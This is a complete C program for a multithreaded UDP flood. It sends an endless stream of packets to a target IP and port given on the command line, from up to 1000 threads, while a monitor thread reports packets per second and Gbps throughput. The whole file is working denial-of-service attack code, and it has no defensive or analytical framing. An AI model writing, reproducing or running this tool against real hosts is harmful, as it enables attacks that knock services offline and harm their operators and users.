#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>

#define PACKET_SIZE 1024  // Bisa naik ke 1460 atau 2048
#define MAX_THREADS 1000

unsigned long pps = 0;

void *flood(void *arg) {
    struct sockaddr_in target = *(struct sockaddr_in *)arg;
    char buffer[PACKET_SIZE];
    memset(buffer, 0x41, PACKET_SIZE); // Payload dummy (A)

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    while (1) {
        sendto(sock, buffer, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        pps++;
    }

    close(sock);
    pthread_exit(NULL);
}

void *pps_monitor(void *arg) {
    unsigned long last = 0;
    while (1) {
        sleep(1);
        unsigned long now = pps;
        unsigned long diff = now - last;
        last = now;

        double gbps = (double)(diff * PACKET_SIZE * 8) / 1e9;
        printf("[MONITOR] PPS: %lu | Gbps: %.2f\n", diff, gbps);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <target_ip> <port> <threads> <seconds>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);

    printf("Starting high-Gbps UDP flood to %s:%d with %d threads for %d seconds\n", ip, port, threads, duration);

    pthread_t mon;
    pthread_create(&mon, NULL, pps_monitor, NULL);

    pthread_t tids[MAX_THREADS];
    for (int i = 0; i < threads; i++) {
        pthread_create(&tids[i], NULL, flood, &target);
    }

    sleep(duration);
    printf("Done.\n");
    return 0;
}
